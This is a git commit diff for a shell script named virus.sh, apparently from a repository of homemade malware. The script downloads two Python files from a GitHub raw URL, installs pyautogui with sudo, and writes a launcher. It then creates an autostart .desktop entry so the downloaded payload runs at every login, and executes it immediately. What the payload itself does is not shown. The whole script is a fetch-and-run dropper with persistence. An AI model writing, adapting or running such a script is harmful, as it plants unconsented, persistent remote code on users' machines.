0df1fa9b52de6f57001fae7a59d108efd8240dcb
MichalkapDeveloper <90312060+MichalkapDeveloper@users.noreply.github.com>
2022-02-07 17:22:03 +0100

    Update virus.sh

--- virus.sh
+++ virus.sh
@@ -1,7 +1,13 @@
+rm s.py
+rm addautostart.py
 wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/s.py'
 wget 'https://raw.githubusercontent.com/MichalkapDeveloper/wirusy/main/addautostart.py'
 user=$(whoami)
 sudo pip3 install pyautogui
-echo "user=$(whoami) && python3 /home/$user/s.py" > s.sh
+rm s.sh
+echo "python3 /home/$user/s.py" > s.sh
 chmod +x s.sh
+eval $"rm '/home/$user/.config/autostart/?.desktop'"
 python3 /home/$user/addautostart.py '?' './home/$user/s.sh'
+eval $"chmod +x '/home/$user/.config/autostart/?.desktop'"
+bash s.sh
